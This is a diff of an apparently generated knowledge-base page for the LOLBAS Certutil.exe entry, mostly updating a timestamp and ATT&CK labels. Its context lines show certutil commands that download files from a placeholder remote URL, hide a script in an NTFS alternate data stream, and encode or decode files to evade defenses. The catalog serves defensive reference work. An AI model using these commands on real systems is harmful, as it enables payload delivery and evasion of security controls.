@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Certutil.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Certutil.exe"
@@ -25,16 +25,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Certutil.exe
-
 Windows binary used for handling certificates
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Certutil.yml
 
 ## Paths
 
@@ -54,7 +45,7 @@ certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
 - Use Case: Download file from Internet
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 2. Download
 
@@ -67,7 +58,7 @@ certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
 - Use Case: Download file from Internet
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 3. ADS
 
@@ -80,7 +71,7 @@ certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
 - Use Case: Download file from Internet and save it in an NTFS Alternate Data Stream
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]
+- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]
 
 ### 4. Download
 
@@ -93,7 +84,7 @@ certutil.exe -URL {REMOTEURL:.exe}
 - Use Case: Download file from Internet
 - Privileges: User
 - Operating System: Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 5. Encode
 
@@ -106,7 +97,7 @@ certutil -encode {PATH} {PATH:.base64}
 - Use Case: Encode files to evade defensive measures
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1027-obfuscated_files_or_information|T1027.013]]
+- ATT&CK: [[kb/attack/techniques/T1027-obfuscated_files_or_information#^t1027013-encrypted-encoded-file|T1027.013: Encrypted/Encoded File]]
 
 ### 6. Decode
 
@@ -119,7 +110,7 @@ certutil -decode {PATH:.base64} {PATH}
 - Use Case: Decode files to evade defensive measures
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140]]
+- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140: Deobfuscate/Decode Files or Information]]
 
 ### 7. Decode
 
@@ -132,7 +123,7 @@ certutil -decodehex {PATH:.hex} {PATH}
 - Use Case: Decode files to evade defensive measures
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140]]
+- ATT&CK: [[kb/attack/techniques/T1140-deobfuscate_decode_files_or_information|T1140: Deobfuscate/Decode Files or Information]]
 
 ## Detections
 
